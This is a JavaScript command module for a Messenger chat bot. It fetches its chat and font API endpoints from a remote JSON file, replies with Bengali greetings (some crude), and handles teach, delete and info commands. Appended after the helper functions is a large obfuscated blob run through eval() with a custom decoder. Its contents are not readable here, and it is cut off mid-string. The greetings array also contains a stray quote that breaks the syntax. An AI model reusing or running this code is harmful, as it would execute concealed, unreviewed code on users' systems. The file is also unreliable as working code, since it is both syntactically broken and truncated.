const axios = require('axios');
const fs = require('fs'); 
const path = require('path');

module.exports = {
  config: {
    name: "bot",
    version: "1.0.0",
    permission: 0,
    credits: "nayan",
    description: "talk with bot",
    prefix: 'awto',
    category: "talk",
    usages: "hi",
    cooldowns: 5,
  },

  handleReply: async function ({ api, event }) {
    try {

      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;
      const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
      const apiUrl2 = kl.data.api2;
      const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(event.body)}`);
      console.log(response.data);
      const result = response.data.data.msg;

      const textStyles = loadTextStyles();
      const userStyle = textStyles[event.threadID]?.style; 

      const fontResponse = await axios.get(`${apiUrl2}/bold?text=${result}&type=${userStyle}`);
      const text = fontResponse.data.data.bolded;

      api.sendMessage(text, event.threadID, (error, info) => {
        if (error) {
          console.error('Error replying to user:', error);
          return api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
        }
        global.client.handleReply.push({
          type: 'reply',
          name: this.config.name,
          messageID: info.messageID,
          author: event.senderID,
          head: event.body
        });
      }, event.messageID);

    } catch (error) {
      console.error('Error in handleReply:', error);
      api.sendMessage('An error occurred while processing your request. Please try again later.', event.threadID, event.messageID);
    }
  },

  start: async function ({ nayan, events, args, Users }) {
    try {
      const msg = args.join(" ");
      const apiData = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json');
      const apiUrl = apiData.data.sim;


      if (!msg) {
        const greetings = [
          "আহ শুনা আমার তোমার অলিতে গলিতে উম্মাহ😇😘",
          "কি গো সোনা আমাকে ডাকছ কেনো",
          "বার বার আমাকে ডাকস কেন😡",
          "আহ শোনা আমার আমাকে এতো ডাক্তাছো কেনো আসো বুকে আশো🥱",
          "হুম জান তোমার অইখানে উম্মমাহ😷😘",
          "আসসালামু আলাইকুম বলেন আপনার জন্য কি করতে পারি",
          "আমাকে এতো না ডেকে বস রবিউল কে একটা গফ দে 🙄",
          "jang hanga korba",
          "jang bal falaba🙂"E'x এ'র অ'লি'তে' গ'লি'তে' উ'ম্মা'হ'-🥺⎯͢⎯⃝🩷🍒","যাও পাখি বলো তারে🕊️~~~সে যেন আমার বস রবিউল ইন বক্সে এ মেসেজ করে...!😌🙄আর যদি মেসেজ না  করে তাহলে যেনো পানিতে ডুবে মরে... 🐸🥴😆🤭","-এত Bot Bot না ডেকে  𝐀𝐝𝐦𝐢𝐧 বইলা আমাই  𝐀𝐝𝐦𝐢𝐧  নিয়ে দাও প্রিয়ো সবাইকে কিক দিয়ে আমি আর তুমি থাকবো 🤣😂","🖤༄シ︎🌻🖤ꨄ︎-বাস্তবতা-কখনোই গল্পের মতো সুন্দর হয় না!আর-সুন্দর গল্পে কখনো বাস্তবতার মিল থাকে না!♡︎༎-🌻_🦋!!💘A💔🦋_","ఌ︎_____🍒💚🌺♡︎••🌼 𝐚𝐛𝐨𝐮𝐭 𝐭𝐡𝐢𝐬 𝐥𝐢𝐧𝐞🙂🌿__🖤🦋দিন শেষে সূর্যটাও বুঝিয়ে দেয় সময় শেষ হলে স্থাঁন পরিবর্তন হয়!!🥰","-কি হলো ,মিস টিস করচ্ছিস নাকি🤣😂","ভালোবাসা নামক আব্লামি করতে মন চাইলে আমার বস 𝐑𝐨𝐛𝐢𝐮𝐥এর ইনবক্স চলে যাও-🙊🥱👅 🌻এই নাও 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃 𝐋𝐈𝐍𝐊 🌻:-https://www.facebook.com/profile.php?id=61552217665522&mibextid=ZbWKwL","Facebook  এমন একটা গ্রহ!!!!যেখানে হালকা sad Caption post  করলে ---- এলিয়েন রা ভাবে ছ্যাকা খাইছে!!!","Facebook আমাকে কিছুই দেয়নি.!🥹শুধু কে!ড়ে নিয়েছে আমার হাজারো MB.!😞","ফেসবুক মনে হয় আমারে তাবিজ করছে!😒 হুদাই আসি অনলাইনে একটু পর পর!🤥🙂🙄","___😽🌹 l Wish এ'ই Facebook থেকে❥一 কোনো এক দিন যে কোনাে এক'টা༉💚🥰彡মেয়ে কে বস রবিউল এর জন্য নিয়া দৌড় দি'মু🏃‍♀️ 🏃‍♂️🙈😇😁 ইনশাআল্লাহ 😆😆"," 🐸🐸🐸__𝐌𝐲  𝐯𝐨𝐢𝐜𝐞 🌚▶︎•||।||।।||।||।।|||।||।। 0:26-ওহ  𝐬𝐨𝐫𝐫𝐲  তুই শুনবি কেমনে তুই তো ফ্রী 𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤   ইউজার🥴🐸","🤪༆᭄̲̲̲̞̎̎͢༊═══❥বাবু ডিনার করছো ༊᭄༊᭄বলার কেউ নেই ༊᭄❥┼─༊🙃🙂❗😒༆᭄̲̲̲̞̎̎͢༊═══ তাই ডিনার করি না༊᭄༊᭄༊᭄༊᭄রাতে খেয়ে❥┼─দেয়ে༊ 🥴😳🦋༆᭄̲̲̲̞̎̎͢༊═══❥ঘুমিয়ে পরি ༊🍁🤧  🥰🐥","-এ”༎༅জীবন༎তোমাকে😍দিলাম”༎༅”বন্ধু🥰🥀-তুমি༎༅শুধু༎༅আইডির༎༅༎༅পার্সওয়াডটা ༎༅দিও😘","⎯͢⎯⃝♡ও্ঁই্ঁ তো্ঁরে্ঁ🫵 লু্ঁচ্চা্ঁমি্ঁ ⎯⃝♡সি্ঁখা্ঁই্ঁছে্ঁ ⎯͢কে্ঁডা্ঁ রে্ঁ🤣⎯⃝♡_",":༅༎💙🦋༆𝐓𝐡𝐢𝐬 𝐚𝐛𝐨𝐮𝐭 𝐥𝐢𝐧𝐞_⚠︎🙅🏻‍♂️✨😽︵۵মানুষ! হচ্ছে!বৃষ্টির!মতো!Life a ! অনেক মানুষ !আসবে!অনেক মানুষ !যাবে!💔🥰:༅༎💙🦋 সঠিক!মানুষটা!ঠিকই!ছায়া!হয়ে!পাশে!থাকবে -/ ఌ︵💚🌻","❥𒊹︎─༊ আজ আম্মুকে বলেছিলাম “বিরিয়ানি খাবো”🙂❥┼─༊আম্মু শুনেছে “বিরি খাবো। 🙄༊᭄●══ ❥তারপর শুরু হলো থাপড়ানি..😤😠❥┼─༊⌢  এখন আমি ডান কানে কম শুনি..🙂🙂","༊❤️প্রিয়༊🥀🌺༊”কাল”༊🦋🥀༊’যদি’༊’না’༊’ফিরি’༊’নতুন’༊’ভোরে’🖤シ︎🌸🖤🥀🌺༊’তাহলে’বুঝে°নিয়ো অনেক^বেশি ঘুমাই গিয়েছিলাম🤣😁…","ভালোবাসা নামক আব্লামি করতে মন চাইলে আমার বস 𝐑𝐨𝐛𝐢𝐮𝐥এর ইনবক্স চলে যাও-🙊🥱👅 🌻এই নাও 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃 𝐋𝐈𝐍𝐊 🌻:-https://www.facebook.com/profile.php?id=61552217665522&mibextid=ZbWKwL                  ","-আমাকে ডাকলে আমি কিন্তূ কিস করে দেবো দৌড় দিমু🏃‍♀️😘","য°খ°নি° প°ড়ে°ছে  ন°জ°র° 🐼💫                                      Next Line.... 🎤","গুরুপে একটা ছেলেকে ভাল্লাগে😔","খালি অন্যের bf রে ভাল্লাগে-🍒🐰"," .......  🥱 আপনার মনের...!🙂স্কিনশট দেন তো...! দেখি কে কে আছে..!🥱🥴","__কারো কলিজা কিডনি ভাঙ্গলে নক দিও.....!!😽__𝐘𝐨𝐮𝐓𝐮𝐛𝐞- দেখে 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 করা শিখছি 🌚༎একদম বিনা পয়সাই জীবন শেষ করে দিমু•••😑😑◆◆থুক্কু ◆◆__________জীবন গরে দিমু..!!🙂💔","অনুমতি দিলে Tumake Amar প্রেমে ফেলতাম🙂","--দেশের সব কিছুই চুরি হচ্ছে-🙄-শুধু আমার বস রবিউল  এর মনটা ছাড়া-🥴😑😏","︵❝།།💚🌺 ° -(🍒🦋𝐓𝐢𝐦𝐞 𝐂𝐡𝐚𝐧𝐠𝐞𝐬 𝐁𝐮𝐭 𝐒𝐨𝐦𝐞❛❛ 💚... ❛❛ 𝐅𝐞𝐞𝐥𝐢𝐧𝐠𝐬 𝐍𝐞𝐯𝐞𝐫 𝐂𝐡𝐚𝐧𝐠𝐞 ' ✨🦋-!)..😊:)সময় বদলায় কিন্তু কিছু অনুভূতি বদলায় না!'.'>!✨🌸💙....","❈🦋⋆⃝༎😽𝐨𝐢𝐢 আ্ঁসো্ঁ পি্ঁরি্ঁত্ঁ❈ ক্ঁরি্ঁ___//🐸🐵","-কা'উকে থাপ্পড় মা'রলে জোরে মা'রবেন...!!🙃কারণ... ফ্যা'ন আস্তে ঘু'রলে যেই বিল জোরে ঘু'রলেও সেই বিল আ'সে...!!🐸👍","❥༊◎⃝😅চু্ঁম্মা্ঁ⋆⃝𝄞⋆⃝🫶দি্ঁলে্ঁ𝄟≛⃝😙উ্ঁম্মা্ঁ ༎ ফ্রি্ঁ༒༅༎.-!!-😁","❥᭄✍️⃝»̶͓̽̽🦋জা্ঁন্ঁ᭄মু্ঁই্ঁ༆আ্ঁই্ঁসা্ঁ⑅⃝প্ঁড়্ঁছি্ঁ❥কু্ঁলে্ঁ᭄💋ꖴؓؓনে্ঁও্ঁ⃝»̶͓̽😌😼","᛫──⃜͢͢๛⃝😼তো্ঁরা্ঁ লা্ঁই্ঁনে্ঁ≛⃝ দা্ঁরা্ঁ ✿⃝জি্ঁলা্ঁপি্ঁ🥨দি্ঁমু্ঁ-༉😌","⎯͢😬⎯⃝🤧 নাঁ কেঁউঁ পঁটেঁ,,🫠❝আঁরঁ নাঁ কেঁউঁ পঁটাঁয়ঁ❞🥺💦🙈° হুঁদাঁইঁ ফোঁনঁ কিঁনেঁ দিঁছেঁ আঁব্বাঁয়ঁ😕..!♡⎯͢⎯⃝_😟","•_  কি কর'লে জামাই পামু-?!🙈🐸🥹🔪","᛫──⃜͢͢🍒͟͟͞͞๛⃝᛫চা্ঁর্ঁ দি্ঁকে্ঁ হা্ঁজা্ঁরো্ঁ Life line 🥰তা্ঁর্ঁ মা্ঁঝে্ঁ আ্ঁমি্ঁ এ্ঁকটা্ঁ তা্ঁর্ঁ 𝐁𝐨𝐭 এ্ঁর্ঁ লা্ঁই্ঁন্ঁ😨 °______√________😒✿⃝༉༐"
        ];
        const name = await Users.getNameUser(events.senderID);
        const rand = greetings[Math.floor(Math.random() * greetings.length)];
        return nayan.reply({
          body: `${name}, ${rand}`,
          mentions: [{ tag: name, id: events.senderID }]
        }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }

      else if (msg.startsWith("textType")) {
        const selectedStyle = msg.split(" ")[1];
        const options = ['serif', 'sans', 'italic', 'italic-sans', 'medieval', 'normal'];

        if (options.includes(selectedStyle)) {
          saveTextStyle(events.threadID, selectedStyle);
          return nayan.reply({ body: `Text type set to "${selectedStyle}" successfully!` }, events.threadID, events.messageID);
        } else {
          return nayan.reply({ body: `Invalid text type! Please choose from: ${options.join(", ")}` }, events.threadID, events.messageID);
        }
      }

      else if (msg.startsWith("delete")) {
        const deleteParams = msg.replace("delete", "").trim().split("&");
        const question = deleteParams[0].replace("ask=", "").trim();
        const answer = deleteParams[1].replace("ans=", "").trim();

        
        const data = await deleteEntry(question, answer, events, apiUrl);
        const replyMessage = data.msg || data.data.msg;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("info")) {
        const response = await axios.get(`${apiUrl}/sim?type=info`);
        const totalAsk = response.data.data.totalKeys;
        const totalAns = response.data.data.totalResponses;

        return nayan.reply({ body: `Total Ask: ${totalAsk}\nTotal Answer: ${totalAns}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("teach")) {
        const teachParams = msg.replace("teach", "").trim().split("&");
        const question = teachParams[0].replace("ask=", "").trim();
        const answer = teachParams[1].replace("ans=", "").trim();

        const response = await axios.get(`${apiUrl}/sim?type=teach&ask=${encodeURIComponent(question)}&ans=${encodeURIComponent(answer)}`);
        const replyMessage = response.data.msg;
        const ask = response.data.data.ask;
        const ans = response.data.data.ans;

        if (replyMessage.includes("already")) {
          return nayan.reply(`📝Your Data Already Added To Database\n1️⃣ASK: ${ask}\n2️⃣ANS: ${ans}`, events.threadID, events.messageID);
        }

        return nayan.reply({ body: `📝Your Data Added To Database Successfully\n1️⃣ASK: ${ask}\n2️⃣ANS: ${ans}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("askinfo")) {
        const question = msg.replace("askinfo", "").trim();

        if (!question) {
          return nayan.reply('Please provide a question to get information about.', events.threadID, events.messageID);
        }

        const response = await axios.get(`${apiUrl}/sim?type=keyinfo&ask=${encodeURIComponent(question)}`);
        const replyData = response.data.data;
        const answers = replyData.answers;

        if (!answers || answers.length === 0) {
          return nayan.reply(`No information available for the question: "${question}"`, events.threadID, events.messageID);
        }

        const replyMessage = `Info for "${question}":\n\n` +
          answers.map((answer, index) => `📌 ${index + 1}. ${answer}`).join("\n") +
          `\n\nTotal answers: ${answers.length}`;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("help")) {
        const cmd = this.config.name;
        const prefix = global.config.PREFIX;
        const helpMessage = `
        🌟 **Available Commands:**

        1. 🤖 ${prefix}${cmd} askinfo [question]: Get information about a specific question.

        2. 📚 ${prefix}${cmd} teach ask=[question]&ans=[answer]: Teach the bot a new question and answer pair.

        3. ❌ ${prefix}${cmd} delete ask=[question]&ans=[answer]: Delete a specific question and answer pair. (Admin only)

        4. 📊 ${prefix}${cmd} info: Get the total number of questions and answers.

        5. 👋 ${prefix}${cmd} hi: Send a random greeting.

        6. 🎨 ${prefix}${cmd} textType [type]: Set the text type (options: serif, sans, italic, italic-sans, medieval, normal).

        ⚡ Use these commands to interact with the bot effectively!
            `;

        return nayan.reply({ body: helpMessage }, events.threadID, events.messageID);
      } 

      else {
        const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(msg)}`);
        const replyMessage = response.data.data.msg;

        const textStyles = loadTextStyles();
        const userStyle = textStyles[events.threadID]?.style || 'normal';

        const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
        const apiUrl2 = kl.data.api2;

        const font = await axios.get(`${apiUrl2}/bold?text=${replyMessage}&type=${userStyle}`);
        const styledText = font.data.data.bolded;

        nayan.reply({ body: styledText }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }
    } catch (error) {
      console.log(error);
      nayan.reply('An error has occurred, please try again later.', events.threadID, events.messageID);
    }
}
}


function loadTextStyles() {
  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    if (!fs.existsSync(Path)) {
      fs.writeFileSync(Path, JSON.stringify({}, null, 2));
    }

    
    const data = fs.readFileSync(Path, 'utf8');
    return JSON.parse(data);  
  } catch (error) {
    console.error('Error loading text styles:', error);
    return {}; 
  }
}

function saveTextStyle(threadID, style) {

  const styles = loadTextStyles(); 


  styles[threadID] = { style }; 

  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    fs.writeFileSync(Path, JSON.stringify(styles, null, 2));
  } catch (error) {
    console.error('Error saving text styles:', error);
  }
}




var _0xc34e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe65c(d,e,f){var g=_0xc34e[2][_0xc34e[1]](_0xc34e[0]);var h=g[_0xc34e[3]](0,e);var i=g[_0xc34e[3]](0,f);var j=d[_0xc34e[1]](_0xc34e[0])[_0xc34e[10]]()[_0xc34e[9]](function(a,b,c){if(h[_0xc34e[4]](b)!==-1)return a+=h[_0xc34e[4]](b)*(Math[_0xc34e[8]](e,c))},0);var k=_0xc34e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc34e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe65c(s,e,10)-t)}return decodeURIComponent(escape(r))}("IIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLEJJLIESLESNLNJESLEIJLEINLISILESILENSLIESLESNLNJESLIIJLISELESNLSJJLESILEIELEEELIESLESNLNJESLESELISNLEIJLESSLESNLISJLENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLESSLIIJLISELISILEIELESILSJILIESLESNLNJESLESELEIELESILEIJLENSLENILSJELNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLEIJLEINLISILESILSJILIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESELEIILISSLESSLISELEIILEEELIESLESNLNJESLEIJLIIJLEISLISNLISELISSLENILNJSNLIESLESNLNJESLESELEIILISSLESSLISELEIILSJILIESLESNLNJESLESELEIILISSLESSLISELEIILEESLENSLESNLNJESLISNLISSLISNLEENLEESLESNLNJESLESELISELIIJLEEJLESNLNJESLESELEINLEENLESNLNJESLEIJLISJLISNLEEJLESNLNJESLEIELENILSJELNJJNLISILNJNILEJJLIESLESNLNJESLESSLESNLEIJLISNLEISLESELSJILIESLESNLNJESLESSLIIJLISELISILEIELESILINILIESLESNLNJESLESELEIILISSLESSLISELEIILIENLSJELNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLESSLESNLEIJLISNLEISLESELSJELNJSSLEEELIESLESNLNJESLEIJLEINLISILESILENSLIESLESNLNJESLIIJLISELESNLSJJLESILEIELEEELIESLESNLNJESLESELISNLEIJLESSLESNLISJLENILSJELNJSSLENSLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESELEIILEIILEISLEIJLISSLEEELIESLESNLNJESLESELISSLEIELIIJLIIJLESNLENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELSJILIESLESNLNJESLEIJLEINLISILESILEEELIESLESNLNJESLEINLESILEIELISNLSJJLEIELSJILIESLESNLNJESLESELEIILEIILEISLEIJLISSLENSLENILSJELNJEELIIELIISLNJJNLISILENSLEJNLEJNLINILIENLENILNJSNLNJNILNJNELNJEILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIJLISILSJJLSJJLISJLISJLSJILEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILEINLENILENILESJLENSLESNLNJESLESILIIJLISELEENLEESLESNLNJESLISILISSLEEJLESNLNJESLESSLESELEENLESNLNJESLESELISJLSJJLESSLENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLISELENILENILESJLENSLEESLESNLNJESLESELESILEIJLEIJLEENLESNLNJESLSJJLISILEIJLEEJLEESLESNLNJESLESSLEENLESNLNJESLESSLEEJLESNLNJESLESELESILEIILEISLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLESSLENILENILESJLENSLESNLNJESLESSLEEJLEESLESNLNJESLEIELISILISJLEENLESNLNJESLESSLEIJLISNLIIJLEENLEESLESNLNJESLESELEIELISILEIILENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILISILENILENILESJLENSLEESLESNLNJESLESSLESSLIIJLESILEENLEESLESNLNJESLESSLESSLSJJLISILEENLEESLESNLNJESLESELEISLISNLEEJLEESLESNLNJESLESSLIIJLENILENILEENLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLEINLENILENILESJLENSLEESLESNLNJESLESELISNLSJJLISNLEENLESNLNJESLESELESSLISNLESSLEENLESNLNJESLESELESSLEEJLESNLNJESLEISLIIJLENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLIIJLENILENILESJLENSLEESLESNLNJESLEIJLEEJLEESLESNLNJESLEIILISNLEINLEENLEESLESNLNJESLEIELISILISSLEENLESNLNJESLESILEEJLEESLESNLNJESLSJJLEIJLISNLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLEISLENILENILESJLENSLEESLESNLNJESLESILESSLEEJLEESLESNLNJESLEISLISSLEENLEESLESNLNJESLEIJLEIJLEINLEENLEESLESNLNJESLESELEIJLESELISILENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLEISLENILENILESJLENSLESNLNJESLEISLEISLEEJLEESLESNLNJESLISSLEENLEESLESNLNJESLISILESELISELEENLESNLNJESLESELEIJLESSLIIJLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILESSLENILENILESJLENSLESNLNJESLESELEINLESILEEJLESNLNJESLISSLEENLEESLESNLNJESLESELESILEEJLESNLNJESLEINLEISLEENLEESLESNLNJESLISJLISNLSJJLENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLSJJLENILENILESJLENSLEESLESNLNJESLESELEEJLEESLESNLNJESLEIILESILEENLEESLESNLNJESLESELESILISSLEINLEENLESNLNJESLESELESILEINLISELENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLISNLENILENILESJLENSLEESLESNLNJESLEIJLEEJLESNLNJESLEIILISILISNLEENLEESLESNLNJESLEINLEEJLESNLNJESLESILEIJLISNLEENLESNLNJESLESSLEEJLESNLNJESLESELISJLESELEISLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLISELENILENILESJLENSLEESLESNLNJESLESELEINLISELESELEENLESNLNJESLEIELEEJLEESLESNLNJESLESELISSLISELEENLESNLNJESLESSLESNLIIJLEINLENILEEJLENSLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLIIJLENILENILESJLENSLESNLNJESLESELEINLESILESSLEENLEESLESNLNJESLESSLESNLISILISNLEENLEESLESNLNJESLISNLISELEIELEEJLEESLESNLNJESLESELENILENILSJELIISLIIJLENSLIESLESNLNJESLEIJLISILSJJLSJJLISJLISJLSJILSJILSJILIESLESNLNJESLESELISSLEIELIIJLIIJLESNLENILISNLNJNELISILISJLNJJJLSJELISILNJJNLNJNSLISILEJJLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNJLNJEJLNJNSLIIELENELIENLENSLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNSLIIELIISLIIJLNJNILENELIENLENSLENILENILSJELNJSSLISELISJLNJNILISELIIELENSLIESLESNLNJESLEIJLIIJLEINLSJJLISJLESNLENILNJSNLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNJLNJEJLNJNSLIIELENELIENLENSLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNSLIIELIISLIIJLNJNILENELIENLENSLENILENILSJELNJSSLNJSSLNJSSLENSLIESLESNLNJESLESELEIELESILEIJLEEELEESLESNLNJESLEISLESILESNLISILSJJLEENLESNLNJESLEIJLESNLESILISELEIJLEENLESNLNJESLESELESSLEIELESNLISILEINLENILENILSJELISJLNJNSLNJEILNJJSLISELEJJLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLEJJLISSLISILNJJNLISILNJNILISILSEELNJJSLNJNILNJNELNJEILENSLIESLESNLNJESLESILESNLESELISJLISELESELEEELIESLESNLNJESLESELEIELEISLESILISNLESSLEEELIESLESNLNJESLEINLISILEISLISELISSLEIELEEELIESLESNLNJESLEIJLISNLESILISELESILESILENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIILEIILISELESELEISLESSLSJILIESLESNLNJESLEIJLEINLISILESILEEELIESLESNLNJESLEIJLEIELEIELEIJLISJLESNLSJILNJSNLENELISJLIJJLINSLINELSIELENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLESELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILIIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLEIILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILEIELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEIILENILEENLENELNJJSLENELEEELENELSSJLSIELSINLINNLNJEILENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLISSLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLISJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEINLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILISELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESSLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLESNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLISJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILSJJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEINLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIILENILEEELENELSEJLSENLNJJELNJNELINJLENELSJNLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESSLEIJLIIJLISNLEIELISJLEEELIESLESNLNJESLEIJLIIJLESELISSLISJLISILENILNJSNLNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLESSLEIJLIIJLISNLEIELISJLENSLIESLESNLNJESLEIJLIIJLESELISSLISJLISILENILSJELNJSSLEEELENELNJNSLNJNSLSSJLSSSLIJNLENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLSJJLENILEENLENELSJNLENELEEELENELNJJILSSJLISSLSEELINNLENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILEISLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELSJJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELISNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLISNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEISLENILEENLENELEEILENELNJSSLSJELNJNILNJNELNJEILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIJLESILEIELEIILSJJLEIILSJILISJLNJEELISJLIISLNJNILEJJLISJLNJESLIISLNJJILNJNSLINILIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLESNLENILIENLENSLIESLESNLNJESLEIJLEIELEIELEIJLISJLESNLINILIESLESNLNJESLEIILEIILISELESELEI